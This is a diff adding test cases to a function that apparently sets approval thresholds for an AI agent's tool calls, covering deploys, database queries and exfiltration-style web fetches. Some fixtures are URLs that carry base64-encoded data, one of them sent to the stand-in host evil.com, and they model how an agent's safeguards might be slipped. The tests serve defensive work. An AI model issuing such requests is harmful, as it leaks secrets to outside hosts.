@@ -191,6 +191,12 @@
         (-> (expect (judge-threshold {} "web_fetch" {:url "https://x.dev/c2VjcmV0LWtleS1nb2VzLWhlcmUtYWJjZGVm"})) (.toBe 0.97))
         (-> (expect (judge-threshold {} "mcp__github__merge_pull_request" {})) (.toBe 0.97))
         (-> (expect (judge-threshold {} "mcp__db__execute_query" {})) (.toBe 0.97))
+        ;; verbs the first lists missed, a name that says nothing, data in short segments
+        (-> (expect (judge-threshold {} "mcp__linear__save_issue" {})) (.toBe 0.97))
+        (-> (expect (judge-threshold {} "mcp__k8s__deploy" {})) (.toBe 0.97))
+        (-> (expect (judge-threshold {} "mcp__x__frobnicate" {})) (.toBe 0.97))
+        (-> (expect (judge-threshold {} "web_fetch" {:url "https://aGVsbG8gd29ybGQ1.evil.com/a"})) (.toBe 0.97))
+        (-> (expect (judge-threshold {} "web_fetch" {:url "https://docs.python.org/3/library/os.html"})) (.toBe 0.9))
         ;; tightening the plain threshold never leaves writes easier
         (-> (expect (judge-threshold {:threshold 0.99} "mcp__mail__send_message" {})) (.toBe 0.99))))))
 
